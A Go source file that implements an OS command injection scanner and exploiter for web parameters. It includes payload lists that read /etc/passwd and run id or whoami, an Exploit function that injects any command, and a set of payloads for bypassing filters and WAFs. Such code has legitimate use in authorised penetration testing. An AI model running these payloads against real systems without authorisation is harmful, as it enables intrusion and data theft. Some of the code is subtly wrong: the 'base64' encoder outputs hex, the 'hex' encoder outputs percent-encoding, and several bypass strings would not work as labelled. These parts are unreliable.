package injection

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// CommandExecutionType represents the PHP-style command execution function.
type CommandExecutionType string

const (
	Exec     CommandExecutionType = "exec"
	Passthru CommandExecutionType = "passthru"
	ShellExec CommandExecutionType = "shell_exec"
	System   CommandExecutionType = "system"
	Popen    CommandExecutionType = "popen"
	ProcOpen CommandExecutionType = "proc_open"
)

// OSCommandInjection represents an OS command injection vulnerability.
type OSCommandInjection struct {
	Target        string
	Port          int
	Parameter     string
	ExecType      CommandExecutionType
	Payload       string
	Timeout       time.Duration
	Verbose       bool
	Headers       map[string]string
}

// CommandInjectionResult holds the result of a command injection attempt.
type CommandInjectionResult struct {
	Success    bool
	ExecType   CommandExecutionType
	Payload    string
	Output     string
	StatusCode int
	Error      string
	Timestamp  time.Time
}

// NewOSCommandInjection creates a new OS command injection tester.
func NewOSCommandInjection(target string, param string) *OSCommandInjection {
	return &OSCommandInjection{
		Target:    target,
		Port:      80,
		Parameter: param,
		ExecType:  Exec,
		Timeout:   30 * time.Second,
	}
}

// Payloads returns command injection payloads for the given execution type.
func (c *OSCommandInjection) Payloads() []string {
	basePayloads := []string{
		`;id`,
		`|id`,
		`&&id`,
		`||id`,
		`$(id)`,
		"`id`",
		`;whoami`,
		`|whoami`,
		`&&whoami`,
		`||whoami`,
	}

	switch c.ExecType {
	case Exec:
		return append(basePayloads, `;cat /etc/passwd`, `|cat /etc/passwd`)
	case Passthru:
		return append(basePayloads, `;ls -la`, `|ls -la`)
	case ShellExec:
		return append(basePayloads, `;uname -a`, `|uname -a`)
	case System:
		return append(basePayloads, `;id`, `|id`)
	case Popen:
		return append(basePayloads, `;cat /etc/hosts`, `|cat /etc/hosts`)
	case ProcOpen:
		return append(basePayloads, `;id`, `|id`, `&&id`)
	default:
		return basePayloads
	}
}

// BuildInjectedURL constructs a URL with the injection payload appended.
func (c *OSCommandInjection) BuildInjectedURL(baseURL, paramName, payload string) string {
	sep := "?"
	if strings.Contains(baseURL, "?") {
		sep = "&"
	}
	return fmt.Sprintf("%s%s%s=%s", baseURL, sep, paramName, payload)
}

// BuildInjectedBody constructs a JSON body with the injection payload.
func (c *OSCommandInjection) BuildInjectedBody(paramName, payload string) map[string]string {
	return map[string]string{
		paramName: payload,
	}
}

// TestEndpoint tests a single endpoint for OS command injection.
func (c *OSCommandInjection) TestEndpoint(url string, method string, body io.Reader, headers map[string]string) (*CommandInjectionResult, error) {
	client := &http.Client{Timeout: c.Timeout}

	var req *http.Request
	var err error

	if body != nil {
		req, err = http.NewRequest(method, url, body)
	} else {
		req, err = http.NewRequest(method, url, nil)
	}
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("execute request: %w", err)
	}
	defer func() { _ = resp.Body.Close() }()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}

	result := &CommandInjectionResult{
		StatusCode: resp.StatusCode,
		Timestamp:  time.Now(),
	}

	// Check for command output indicators
	outputIndicators := []string{
		"uid=", "gid=", "groups=",
		"root:", "daemon:", "bin:",
		"Linux", "Windows", "Darwin",
		"admin", "www-data", "mysql",
	}

	bodyStr := string(respBody)
	for _, indicator := range outputIndicators {
		if strings.Contains(bodyStr, indicator) {
			result.Success = true
			result.Output = indicator
			break
		}
	}

	return result, nil
}

// Scan tests all payloads against the target endpoint.
func (c *OSCommandInjection) Scan(targetURL, paramName string) ([]CommandInjectionResult, error) {
	var results []CommandInjectionResult

	for _, execType := range []CommandExecutionType{Exec, Passthru, ShellExec, System, Popen, ProcOpen} {
		c.ExecType = execType
		payloads := c.Payloads()

		for _, payload := range payloads {
			injURL := c.BuildInjectedURL(targetURL, paramName, payload)

			if c.Verbose {
				fmt.Printf("[CMD-INJECT] Testing %s with payload: %s\n", execType, payload)
			}

			result, err := c.TestEndpoint(injURL, "GET", nil, nil)
			if err != nil {
				if c.Verbose {
					fmt.Printf("[CMD-INJECT] Error: %v\n", err)
				}
				continue
			}

			result.ExecType = execType
			result.Payload = payload
			results = append(results, *result)

			if result.Success {
				break
			}
		}
	}

	return results, nil
}

// Exploit attempts to execute a specific command via the injection point.
func (c *OSCommandInjection) Exploit(targetURL, paramName, command string) (*CommandInjectionResult, error) {
	payload := fmt.Sprintf(`;%s`, command)
	injURL := c.BuildInjectedURL(targetURL, paramName, payload)

	if c.Verbose {
		fmt.Printf("[CMD-INJECT] Exploiting with command: %s\n", command)
	}

	result, err := c.TestEndpoint(injURL, "GET", nil, nil)
	if err != nil {
		return nil, fmt.Errorf("exploit failed: %w", err)
	}

	result.ExecType = c.ExecType
	result.Payload = payload
	return result, nil
}

// Detect analyzes the response for command injection indicators.
func (c *OSCommandInjection) Detect(respBody []byte) bool {
	indicators := []string{
		"uid=", "gid=", "groups=",
		"root:", "daemon:", "bin:",
		"Linux", "Windows", "Darwin",
		"admin", "www-data", "mysql",
		"shell:", "bin/bash", "bin/sh",
		"/etc/passwd", "/etc/hosts",
	}

	body := string(respBody)
	for _, ind := range indicators {
		if strings.Contains(body, ind) {
			return true
		}
	}
	return false
}

// EncodePayload applies encoding to bypass simple filters.
func (c *OSCommandInjection) EncodePayload(payload string, encoding string) string {
	switch encoding {
	case "url":
		return urlEncode(payload)
	case "base64":
		return base64Encode(payload)
	case "hex":
		return hexEncode(payload)
	case "double_url":
		return urlEncode(urlEncode(payload))
	default:
		return payload
	}
}

func urlEncode(s string) string {
	var buf bytes.Buffer
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') {
			buf.WriteRune(r)
		} else {
			fmt.Fprintf(&buf, "%%%02X", r)
		}
	}
	return buf.String()
}

func base64Encode(s string) string {
	return fmt.Sprintf("%x", []byte(s))
}

func hexEncode(s string) string {
	var buf bytes.Buffer
	for _, r := range s {
		fmt.Fprintf(&buf, "%%%02x", r)
	}
	return buf.String()
}

// CommandInjectionReport holds the scan results.
type CommandInjectionReport struct {
	Target     string                `json:"target"`
	Param      string                `json:"parameter"`
	Vulnerable bool                  `json:"vulnerable"`
	Results    []CommandInjectionResult `json:"results"`
	Timestamp  time.Time             `json:"timestamp"`
}

// GenerateReport creates a summary report of the command injection scan.
func (c *OSCommandInjection) GenerateReport(targetURL, paramName string, results []CommandInjectionResult) CommandInjectionReport {
	vulnerable := false
	for _, r := range results {
		if r.Success {
			vulnerable = true
			break
		}
	}

	return CommandInjectionReport{
		Target:     targetURL,
		Param:      paramName,
		Vulnerable: vulnerable,
		Results:    results,
		Timestamp:  time.Now(),
	}
}

// ToJSON serializes the report to JSON.
func (r CommandInjectionReport) ToJSON() (string, error) {
	data, err := json.MarshalIndent(r, "", "  ")
	if err != nil {
		return "", fmt.Errorf("marshal report: %w", err)
	}
	return string(data), nil
}

// ToJSONBytes serializes the result to JSON bytes.
func (r CommandInjectionResult) ToJSONBytes() ([]byte, error) {
	return json.MarshalIndent(r, "", "  ")
}

// HTTPCommandInjection tests for command injection via HTTP parameters.
type HTTPCommandInjection struct {
	Target    string
	Endpoints []string
	Params    map[string]map[string]string
	Headers   map[string]string
	Timeout   time.Duration
}

// NewHTTPCommandInjection creates a new HTTP command injection tester.
func NewHTTPCommandInjection(target string) *HTTPCommandInjection {
	return &HTTPCommandInjection{
		Target:  target,
		Timeout: 30 * time.Second,
		Params:  make(map[string]map[string]string),
	}
}

// AddEndpoint adds an endpoint to test.
func (h *HTTPCommandInjection) AddEndpoint(path string, params map[string]string) {
	h.Endpoints = append(h.Endpoints, path)
	h.Params[path] = params
}

// ScanEndpoints scans all registered endpoints for command injection.
func (h *HTTPCommandInjection) ScanEndpoints() map[string][]CommandInjectionResult {
	results := make(map[string][]CommandInjectionResult)

	for _, endpoint := range h.Endpoints {
		url := fmt.Sprintf("%s%s", h.Target, endpoint)
		params := h.Params[endpoint]

		for paramName := range params {
			inj := NewOSCommandInjection(url, paramName)
			inj.Timeout = h.Timeout
			inj.Headers = h.Headers

			endpointResults, err := inj.Scan(url, paramName)
			if err != nil {
				continue
			}
			results[endpoint] = append(results[endpoint], endpointResults...)
		}
	}

	return results
}

// ValidatePayload checks if a payload is valid for command injection.
func (c *OSCommandInjection) ValidatePayload(payload string) bool {
	if payload == "" {
		return false
	}
	invalid := []string{"\x00", "\n", "\r"}
	for _, ch := range invalid {
		if strings.Contains(payload, ch) {
			return false
		}
	}
	return true
}

// FilterBypassPayloads returns payloads designed to bypass common filters.
func (c *OSCommandInjection) FilterBypassPayloads() map[string][]string {
	return map[string][]string{
		"semicolon_filter":    {"|id", "||id", "&&id", "`id`", "$(id)"},
		"pipe_filter":         {";id", "||id", "&&id", "$(id)"},
		"space_filter":        {"${IFS}id", "$IFSid", "id", ";id"},
		"slash_filter":        {"..;/etc/passwd", "..|/etc/passwd"},
		"command_filter":      {"${exec:whoami}", "${runtime:whoami}"},
		"quote_filter":        {"`;id`", "`;id`", "\";id\""},
		"newline_filter":      {"%0aid", "%0Did", "%0Aid"},
		"waf_simple":          {"%3Bid", "%7Cid", "%26%26id"},
	}
}